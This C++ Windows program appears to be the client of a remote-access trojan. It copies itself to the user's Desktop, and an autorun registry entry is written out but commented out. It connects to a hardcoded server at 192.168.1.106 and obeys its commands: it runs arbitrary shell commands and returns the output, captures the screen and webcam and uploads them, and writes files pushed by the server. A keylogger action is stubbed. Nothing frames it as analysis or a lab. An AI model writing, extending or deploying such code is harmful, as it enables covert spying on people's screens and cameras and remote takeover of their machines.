


#include "winproj.h"

#define WIN32_LEAN_AND_MEAN

#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <math.h>
#include <dshow.h>
#include <thread>

#pragma comment (lib, "Strmiids.lib")
#pragma comment (lib, "Quartz.lib")
#pragma comment (lib, "strmiids")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

using namespace std;

#define DEFAULT_BUFLEN 256
#define PIPE_BUFLEN 32768	// we're not able to define how much a command will output	
#define DEFAULT_PORT "27015"

#define HEADER_SIZE 10

enum ACTIONS {
	ACTION_KEYLOG,
	ACTION_SCREENSHOT,
	ACTION_CMD,
	ACTION_LIST_HOSTS,
	ACTION_WEBCAM_SCREENSHOT,
	ACTION_FILE
};


#define SERVER_IP "192.168.1.106"
#define SCREENSHOT_FILENAME "\\test.avi"


WSADATA wsaData;
DWORD width;
DWORD height;

SOCKET ConnectSocket = INVALID_SOCKET;
struct addrinfo *result = NULL, *ptr = NULL, hints;
unsigned char sendbuf[DEFAULT_BUFLEN];
unsigned char recvbuf[DEFAULT_BUFLEN];
unsigned char pipebuf[PIPE_BUFLEN];
int iResult;
int recvbuflen = DEFAULT_BUFLEN;


// camera access specific
HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

IGraphBuilder *pGraph = NULL;
ICaptureGraphBuilder2 *pBuild = NULL;
IMediaControl *pControl = NULL;
IMediaEvent   *pEvent = NULL;
IEnumMoniker *pEnum;
IMoniker* pMoniker = NULL;
IBaseFilter *pCap = NULL;

char screenshot_filepath[128];
wchar_t w_screenshot_filepath[128];
wchar_t wstrbuff[128];
wchar_t wNewLocationBuff[128];
void receiveFile(unsigned char* buffer, int readSoFar);
void addToAutorun(wstring path);




// adds itself to autorun registry
// copies the program from it's running location
// to the specified location
void copySelfToLocationAddToReg(const char * location) {
	// copying to location
	wchar_t wExePath[128];
	GetModuleFileName(NULL, wExePath, 128);
	wstring newPath(strlen(location), L'#');
	mbstowcs(&newPath[0], location, strlen(location));
	bool succ = CopyFile(wExePath, newPath.c_str(), true);

	// if the file creation succeeds, we assume that the file was non existent, 
	// but if it's there, it was also added to the registry.
	if (succ) {
		//adding to the autorun registry
		//HKEY hkey = NULL;
		//LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
		//LONG status = RegSetValueEx(hkey, L"TESTAPP", 0, REG_SZ, (BYTE *)newPath.c_str(), (newPath.size() + 1) * sizeof(wchar_t));
	}
}


// size of dest > size of fst + size of snd
void strconcat(char* fst, char* snd, char* dest) {
	int fstlen = strlen(fst);
	strcpy(dest, fst);
	strcpy(&dest[fstlen], snd);
}


HRESULT InitCaptureGraphBuilder(
	IGraphBuilder **ppGraph,  // Receives the pointer.
	ICaptureGraphBuilder2 **ppBuild  // Receives the pointer.
)
{
	if (!ppGraph || !ppBuild)
	{
		return E_POINTER;
	}
	IGraphBuilder *pGraph = NULL;
	ICaptureGraphBuilder2 *pBuild = NULL;


	HRESULT hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL,
		CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuild);
	if (SUCCEEDED(hr))
	{
		hr = CoCreateInstance(CLSID_FilterGraph, 0, CLSCTX_INPROC_SERVER,
			IID_IGraphBuilder, (void**)&pGraph);
		if (SUCCEEDED(hr))
		{
			pBuild->SetFiltergraph(pGraph);
			*ppBuild = pBuild;
			*ppGraph = pGraph; // The caller must release both interfaces.
			return S_OK;
		}
		else
		{
			pBuild->Release();
		}
	}
	return hr; // Failed
}
HRESULT EnumerateDevices(REFGUID category, IEnumMoniker **ppEnum)
{
	ICreateDevEnum *pDevEnum;
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL,
		CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));

	if (SUCCEEDED(hr))
	{
		hr = pDevEnum->CreateClassEnumerator(category, ppEnum, 0);
		if (hr == S_FALSE)
		{
			hr = VFW_E_NOT_FOUND;
		}
		pDevEnum->Release();
	}
	return hr;
}
void BindFirstVideoDevice(IEnumMoniker *pEnum, IMoniker** pMoniker)
{
	while (pEnum->Next(1, pMoniker, NULL) == S_OK)
	{
		IPropertyBag *pPropBag;
		HRESULT hr = (*pMoniker)->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
		pPropBag->Release();
	}
}

void freeWebcamAll() {
	pControl->Release();
	pEvent->Release();
	pGraph->Release();
	pMoniker->Release();
	pEnum->Release();
	CoUninitialize();
}


void initWebcamAll() {
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	hr = InitCaptureGraphBuilder(&pGraph, &pBuild);
	hr = pGraph->QueryInterface(IID_IMediaControl, (void **)&pControl);
	hr = pGraph->QueryInterface(IID_IMediaEvent, (void **)&pEvent);
	hr = EnumerateDevices(CLSID_VideoInputDeviceCategory, &pEnum);
	BindFirstVideoDevice(pEnum, &pMoniker);
	hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
	pGraph->AddFilter(pCap, L"Capture Filter");
}


// Compares string till the length of first finishes.
int strcmptillfirstends(char* first, char* str) {
	int i = 0;
	while (first[i]) {
		if (first[i] != str[i])
			return 1;
		i++;
	}
	return 0;
}


void initScreenshotFilepath() {
	char * userpath = getenv("USERPROFILE");
	int fplen = strlen(userpath);
	strcpy(screenshot_filepath, userpath);
	char filename[32] = SCREENSHOT_FILENAME;
	strcpy(&screenshot_filepath[fplen], filename);
	mbstowcs(w_screenshot_filepath, screenshot_filepath, 128);
}

void takeWebcamScreenshot() {
	IBaseFilter *pMux;

	hr = pBuild->SetOutputFileName(&MEDIASUBTYPE_Avi, w_screenshot_filepath, &pMux, NULL);
	hr = pBuild->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, NULL, pMux);

	long evCode;
	pControl->Run();
	OAFilterState * pfs = NULL;
	pControl->GetState(5000, pfs);	// wait max 5 seconds for file init
	hr = pEvent->WaitForCompletion(500, &evCode); // 150 -> assuming it's running more than 1000/150 fps
	pControl->Pause();	// pause correctly, to make file have a correct format
	pControl->Stop();
	pMux->Release();
}



void write4BE(unsigned char * ptr, int num) {
	ptr[0] = 0;
	ptr[1] = 0;
	ptr[2] = 0;
	ptr[3] = 0;

	ptr[0] |= (num >> 24);
	ptr[1] |= ((num << 8) >> 24);
	ptr[2] |= ((num << 16) >> 24);
	ptr[3] |= ((num << 24) >> 24);
}

int read4BE(unsigned char * ptr) {
	int inum = 0;

	inum = inum | (ptr[0] << 24);
	inum = inum | (ptr[1] << 16);
	inum = inum | (ptr[2] << 8);
	inum = inum | ptr[3];

	return inum;
}


void initSocketAndConnect() {
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		exit(iResult);
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server adss and port
	iResult = getaddrinfo(SERVER_IP, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		exit(iResult);
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			exit(iResult);
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		printf("Connected successfully.\n");
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		exit(1);
	}
}



void cleanup() {

	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}
	closesocket(ConnectSocket);
	WSACleanup();

}



// IN : string containing a command to execute
// OUT : size of command output
// RESULT : stores command's result in pipebuf char array
int executeCommand(const char* cmd) {
	FILE* pipe = _popen(cmd, "r");
	int cread = 0;
	while (!feof(pipe)) {
		pipebuf[cread++] = fgetc(pipe);
	}
	pipebuf[cread] = '\0';
	_pclose(pipe);
	return cread;
}

// first sends the data with header,
// which should already be in the buffer,
// then, if the data is too big to fit in one
// "packet", it sends pure data without header.
// "packet" - I'm calling HEADER + PAYLOAD, OR PAYLOAD send 
// at one time with send( )

// IN : buffer - contains data with header
// IN : databegin - pointer to data begin

void sendWholeData(unsigned char* buffer, unsigned char* databegin) {
	int size = read4BE(buffer);
	printf("Forwarding with size:%i\n", size);
	int sendBytes;

	int sendMoreTimes = 0;
	if (size > DEFAULT_BUFLEN) {
		sendBytes = DEFAULT_BUFLEN;
		sendMoreTimes = 1;
	}
	else {
		sendBytes = size;
	}

	// databegin size must be greater than DEFAULT_BUFLEN
	// to not access some random memory

	for (int i = 0; i < DEFAULT_BUFLEN - HEADER_SIZE; i++) {
		buffer[i + HEADER_SIZE] = databegin[i];
	}


	// send the header with first data
	send(ConnectSocket, (const char*)buffer, sendBytes, 0);

	// now send the pure data, till everything's sent
	if (sendMoreTimes) {
		int starti = DEFAULT_BUFLEN - HEADER_SIZE;
		while (starti < size) {
			int c = 0;
			for (int i = 0; i < DEFAULT_BUFLEN && starti < size; i++) {
				buffer[i] = databegin[starti++];
				c = i;
			}
			send(ConnectSocket, (const char*)buffer, c, 0);
		}
	}
}

// buff - buff with header, the "packet" should already be filled with data
// bufferbegin - beggining of the data, that will be filled in every "send" besides the first one.
void sendHeaderPrepared(unsigned char* buff, unsigned char* bufferbegin) {

	int totalSize = read4BE(buff);
	printf("total size is %i\n", totalSize);

	if (totalSize <= DEFAULT_BUFLEN) {
		send(ConnectSocket, (const char*)buff, totalSize, 0);
		return;
	}

	int sentSoFar = send(ConnectSocket, (const char*)buff, DEFAULT_BUFLEN, 0);
	int othersSize = HEADER_SIZE + 14 + 40; // other metadata of bmp file and header size

	int bmpdataindex = 0;
	while (sentSoFar < totalSize) {
		int toSend = (totalSize - sentSoFar < DEFAULT_BUFLEN) ? (totalSize - sentSoFar) : DEFAULT_BUFLEN;
		int n = send(ConnectSocket, (const char*)&bufferbegin[bmpdataindex], toSend, 0);
		sentSoFar += n;
		bmpdataindex += n;
	}
	printf("Sent everything:%i\n", sentSoFar);
}


int sendBMPFile(HDC memdc, HBITMAP hbitmap, unsigned char* buffer)
{
	printf("Width:%i, height:%i\n", width, height);
	printf("Sending bmp file\n");
	int success = 0;
	WORD bpp = 24; //or 32 for 32-bit bitmap
	DWORD sizeL = (int)floor((bpp * width + 31) / 32) * 4 * height;	// size of bitmap! not header

	BITMAPFILEHEADER filehdr = { 0 };
	filehdr.bfType = 19778;
	filehdr.bfSize = 54 + sizeL;
	filehdr.bfOffBits = 54;

	BITMAPINFOHEADER infohdr = { sizeof(infohdr) };
	infohdr.biWidth = width;
	infohdr.biHeight = height;
	infohdr.biPlanes = 1;
	infohdr.biBitCount = bpp;

	BYTE *bits = (BYTE *)malloc(sizeL);
	bits[0] = 0xFF;
	GetDIBits(memdc, hbitmap, 0, height, bits, (BITMAPINFO*)&infohdr, DIB_RGB_COLORS);

	FILE* f = fopen("test.bmp", "wb");
	fwrite((const void*)(&filehdr), 1, 14, f);
	fwrite((const void*)(&infohdr), 1, 40, f);
	fwrite((const void*)(bits), 1, sizeL, f);
	fclose(f);

	int size = sizeL + HEADER_SIZE + 54;
	printf("size written is:%i\n", size);

	write4BE(buffer, size);

	int a = 0;

	for (int i = HEADER_SIZE; i < HEADER_SIZE + 14; i++) {
		buffer[i] = *((unsigned char*)(&filehdr) + a);
		a++;
	}
	a = 0;
	for (int i = HEADER_SIZE + 14; i < HEADER_SIZE + 14 + 40; i++) {
		buffer[i] = *((unsigned char*)(&infohdr) + a);
		a++;
	}

	int startIndex = HEADER_SIZE + 14 + 40;
	a = 0;
	for (int i = startIndex; i < DEFAULT_BUFLEN; i++) {
		buffer[i] = bits[a++];
	}

	// use sendWholeData now
	sendHeaderPrepared(buffer, &bits[a]);


	free(bits);
	return success;
}

int ScreenCaptureAndSend(int x, int y, int width, int height)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	HDC memdc = CreateCompatibleDC(hdc);
	HBITMAP hbitmap = CreateCompatibleBitmap(hdc, width, height);
	HGDIOBJ oldbitmap = SelectObject(memdc, hbitmap);
	BitBlt(memdc, 0, 0, width, height, hdc, x, y, SRCCOPY);
	SelectObject(memdc, oldbitmap);

	int ret = sendBMPFile(memdc, hbitmap, recvbuf);

	DeleteObject(hbitmap);
	DeleteDC(memdc);
	ReleaseDC(HWND_DESKTOP, hdc);

	return ret;
}


void sendFile(char* filepath, unsigned char* buff) {
	FILE* f = fopen(filepath, "rb");
	fseek(f, 0, SEEK_END);
	int size = ftell(f);
	fseek(f, 0, 0);
	write4BE(buff, size + HEADER_SIZE);	// shouldn't it be with added	header size?
	int rwSoFar = 0;
	rwSoFar += fread(&buff[HEADER_SIZE], 1, DEFAULT_BUFLEN - HEADER_SIZE, f);
	send(ConnectSocket, (const char*)buff, rwSoFar + HEADER_SIZE, 0);

	while (rwSoFar < size) {
		int n = fread(buff, 1, DEFAULT_BUFLEN, f);
		if (n <= 0) {
			break;
		}
		send(ConnectSocket, (const char*)buff, n, 0);

		rwSoFar += n;
	}
	printf("\n");
	fclose(f);
}

void handleIncoming(unsigned char* buffer, int n) {
	// use exactly the same buffer to sent it out
	int size = read4BE(buffer);
	unsigned char command = buffer[4];
	unsigned char flags = buffer[5];
	int target = read4BE(&buffer[6]);
	if (command == ACTION_KEYLOG) {

	}
	else if (command == ACTION_CMD) {
		int commsize = executeCommand((const char*)&buffer[HEADER_SIZE]);
		if (commsize == 0) {
			return;
		}
		write4BE(buffer, commsize + HEADER_SIZE);
		sendWholeData(buffer, pipebuf);

	}
	else if (command == ACTION_SCREENSHOT) {
		ScreenCaptureAndSend(0, 0, GetSystemMetrics(SM_CXFULLSCREEN), GetSystemMetrics(SM_CYFULLSCREEN));
	}
	else if (command == ACTION_WEBCAM_SCREENSHOT) {
		printf("screenshot command");
		takeWebcamScreenshot();
		sendFile(screenshot_filepath, buffer);
	}
	else if (command == ACTION_FILE) {
		printf("action file\n");
		receiveFile(buffer, n);
	}
}

// buffer contains already received first "packet"
void receiveFile(unsigned char* buffer, int readSoFar) {
	char pathbuf[128];
	int size = read4BE(buffer);
	printf("size of recv:%i\n", size);
	int i = HEADER_SIZE;
	while (buffer[i] != '\0') {
		pathbuf[i - HEADER_SIZE] = buffer[i];
		i++;
	}
	pathbuf[i - HEADER_SIZE] = '\0';
	i++; // go to data begin
	printf("received file path:%s\n", pathbuf);
	printf("Data begin:%i\n", i);


	FILE* f = fopen(pathbuf, "wb");
	fwrite(&buffer[i], 1, DEFAULT_BUFLEN - i, f);

	int nowrecv = 0;
	while (readSoFar < size) {
		nowrecv = (size - readSoFar < DEFAULT_BUFLEN) ? (size - readSoFar) : DEFAULT_BUFLEN;
		printf("Now reading %i\n", nowrecv);
		readSoFar += recv(ConnectSocket, (char*)buffer, nowrecv, 0);
		fwrite(buffer, 1, nowrecv, f);
	}
	printf("fin\n");


	fclose(f);
}

void mainClientLoop() {
	SetProcessDPIAware();
	initWebcamAll();
	initScreenshotFilepath();


	width = GetSystemMetrics(SM_CXSCREEN);
	height = GetSystemMetrics(SM_CYSCREEN);

	initSocketAndConnect();
	while (1) {
		int n = recv(ConnectSocket, (char*)recvbuf, 256, 0);
		handleIncoming(recvbuf, n);
	}

	cleanup();
	freeWebcamAll();
}



// @@@@@@@@@@@@@@@@@@@@@@@@WINAPI BEGIN@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	//@@@@@@@@@@@@@@@@@@@@@@@@@@@2

	// specify new path and copy to this path
	char newpathbuff[128];
	char * userpath = getenv("USERPROFILE");
	strconcat(userpath, (char*)"\\Desktop\\tes.exe", newpathbuff);
	copySelfToLocationAddToReg(newpathbuff);
	// ...


	thread clientThread(mainClientLoop);


	//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


	// Initialize global strings
	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadStringW(hInstance, IDC_WINPROJ, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINPROJ));

	MSG msg;

	// Main message loop:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int)msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEXW wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDC_WINPROJ));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_WINPROJ);
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
}


BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Store instance handle in our global variable

	HWND hWnd = CreateWindowW(szWindowClass, szTitle, 0,
		CW_USEDEFAULT, 0, 260, 100, nullptr, nullptr, hInstance, nullptr);

	if (!hWnd)
	{
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}


LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{

	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}


